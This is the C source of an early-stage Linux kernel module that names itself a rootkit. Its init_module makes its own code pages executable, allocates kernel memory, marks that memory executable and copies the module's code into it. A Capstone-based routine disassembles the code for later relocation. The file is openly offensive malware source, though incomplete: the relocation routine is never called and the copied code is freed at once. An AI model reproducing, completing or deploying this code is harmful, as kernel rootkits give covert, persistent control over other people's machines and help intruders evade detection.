/*
 * ARP RootKit v1.0, a simple rootkit for the Linux Kernel.
 * 
 * Copyright 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>. 
 */

#include <linux/set_memory.h>
#include <linux/slab.h>
#include <linux/namei.h>
#include <linux/proc_fs.h>
#include <linux/pid_namespace.h>
#include <linux/kallsyms.h>
#include <linux/rculist.h>
#include <linux/hash.h>
#include <linux/sched/signal.h>
#include <linux/module.h>       /* Needed by all modules */
#include <linux/kernel.h>       /* Needed for KERN_INFO */
#include <linux/init.h>         /* Needed for the macros */
#include <linux/tty.h>          /* For the tty declarations */
#include <linux/version.h> /* For LINUX_VERSION_CODE */
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/fcntl.h>
#include <asm/uaccess.h>
#include <capstone.h>

/*
 * Macros
 */
#define PAGE_ROUND_DOWN(x) (((unsigned long)(x)) & (~(PAGE_SIZE-1)))
#define PAGE_ROUND_UP(x) ((((unsigned long)(x)) + PAGE_SIZE-1) & (~(PAGE_SIZE-1)))

/*
 * Declarations
 */
extern void pinfo(const char *fmt, ...);
//void *readfile(const char *file, size_t *len);
int relocate(void *code, size_t code_len);
extern void * (*f_kmalloc)(size_t size, gfp_t flags);
extern struct pid * (*f_find_vpid)(pid_t nr);
extern char kernel_start, kernel_end;

int init_module(void)
{
	size_t kernel_len, kernel_paglen, kernel_pages;
	void *kernel_addr = NULL;
	
	kernel_len = &kernel_end - &kernel_start;
	kernel_paglen = PAGE_ROUND_UP((unsigned long)&kernel_start + (kernel_len - 1)) - PAGE_ROUND_DOWN(&kernel_start);
	kernel_pages = kernel_paglen >> PAGE_SHIFT;

	//printk("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_addr = %p, kernel_pagdown_addr = %p\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));

	/*
	 * Make our kernel executable, to can use pinfo().
	 */
	set_memory_x(PAGE_ROUND_DOWN(&kernel_start), kernel_pages);

	/*
     * Linux Kernel symbols for our rootkit.
	 */
	f_kmalloc = kmalloc;
	f_find_vpid = find_vpid;

	/*
     * Insert out rootkit into memory.
	 */
	pinfo("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_start = %p, kernel_start_pagdown = %p", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
	kernel_addr = f_kmalloc(kernel_paglen, GFP_KERNEL);
	if (kernel_addr != NULL) {
		pinfo("kernel_addr = %p, kernel_addr_pagdown = %p", kernel_addr, PAGE_ROUND_DOWN(kernel_addr));
		/*
		 * Make our rootkit code executable.
		 */
		set_memory_x(PAGE_ROUND_DOWN(kernel_addr), kernel_pages);
		pinfo("kernel_addr's pages are now executable.");

		memcpy(kernel_addr, &kernel_start, kernel_len);
		pinfo("kernel is now copied to kernel_addr.");
		
		kfree(kernel_addr);

		return 0;
	} else {
		pinfo("can not allocate memory");
	}

    return -1;
}

void cleanup_module(void)
{
}

int relocate(void *code, size_t code_len) {
	csh handle;
	cs_insn *insn;
	size_t count;
	
	if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
		pinfo("cs_open() error");
		return -1;
	}

	pinfo("%d\n", code_len);
	size_t func_off = ((unsigned long)&init_module - (unsigned long)&kernel_start);
	pinfo("func_off = %d", func_off);
	count = cs_disasm(handle, code + func_off, code_len - func_off, (unsigned long)&kernel_start + func_off, 0, &insn);
	pinfo("%d\n", count);
	if (count > 0) {
		size_t j;
		for (j = 0; j < count; j++) {
			pinfo("0x%"PRIx64":\t%s\t\t%s", insn[j].address, insn[j].mnemonic, insn[j].op_str);
			size_t i;
			for (i = 0; i< insn[j].size; i++) {
				pinfo("%02x", insn[j].bytes[i]);
			}
		}
		cs_free(insn, count);
	} else {
		pinfo("ERROR: Failed to disassemble given code!\n");
		cs_close(&handle);
		return -1;
	}
	cs_close(&handle);

	return 0;
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Abel Romero Pérez aka D1W0U <abel@abelromero.com>");
MODULE_DESCRIPTION("A simple Linux Kernel Module RootKit");
